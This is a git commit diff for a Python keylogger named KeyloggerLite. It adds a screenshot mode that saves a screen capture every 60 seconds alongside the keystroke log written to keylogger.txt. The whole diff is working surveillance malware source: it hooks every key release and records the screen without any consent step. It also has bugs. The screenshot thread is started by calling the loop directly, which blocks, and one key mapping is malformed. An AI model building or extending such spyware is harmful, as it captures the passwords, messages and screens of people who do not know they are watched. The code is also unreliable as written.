3541ed2cc380069a29d1861abf01f1235ee7d1af
eoin-c <c_plasticmask_c@proton.me>
2023-09-07 18:23:58 -0400

    added screenshot mode

--- main.py
+++ main.py
@@ -1,20 +1,25 @@
 import datetime
+import os
+import time
 import argparse
 import keyboard
-import time
 import pyautogui
+import threading
 
 # dict for converting special keys
 special_key_dict = {'space': '<spacebar>',
                     'enter': '<enter_key>',
                     'up': '<up_key>',
-                    'backspace': '<backspace>'}
+                    'backspace': '<backspace>',
+                    'down': '<down_key>',
+                    'left': '<left_key',
+                    'right': '<right_key>',
+                    'escape': '<escape_key>',
+                    'delete': '<delete_key>'}
 
 
 class keyloglite:
     def __init__(self):
-        # by default screenshots are disabled
-        self.screenshotmode = False
         self.logstring = ""
 
     # recursive function to record keystrokes, store into logstring var
@@ -29,22 +34,38 @@ class keyloglite:
         if len(self.logstring) > 10:
             file = open("keylogger.txt", "a")
             file.write(self.logstring)
-            # clear the logstring when its been written
+            # clear the logstring when it's been written
             self.logstring = ""
+
+    def screenshot(self):
+        # take a screenshot every 60 seconds
+        while True:
+            screenshot = pyautogui.screenshot()
+            screenshot.save(f'./screenshots/screenshot_{str(datetime.datetime.now())}.png')
+            print('Screeny taken')
+            time.sleep(60)
 
     def main(self):
         parser = argparse.ArgumentParser()
-        parser.add_argument('--sm', '--screenshot',
+        parser.add_argument('--sm',
+                            '--screenshot',
                             default=False,
-                            action='store_true',
-                            help='Enable screenshot mode, this will save screenshots every 60 seconds to a local dir '
-                                 'called "keylog_screenshots"')
+                            action='store_true')
         args = parser.parse_args()
-        if args.sm:
-            print('okay lol')
+
         print("Started KeyloggerLite")
+        if args.sm:
+            if os.path.exists('./screenshots'):
+                print('dir exists, continuing..')
+            else:
+                os.mkdir('./screenshots')
+            print('Screenshot mode enabled')
+            threading.Thread(target=self.screenshot(),
+                             daemon=True).start()
+        else:
+            print('Screenshot mode disabled')
         file = open("keylogger.txt", "a")
-        file.write(str(datetime.datetime.now()) + " keylogger started\n")
+        file.write(str(datetime.datetime.now()) + f" keylogger started at {datetime.datetime.now()} \n")
         # record keystrokes and add to logstring
         keyboard.on_release(self.key_event)
         keyboard.wait()
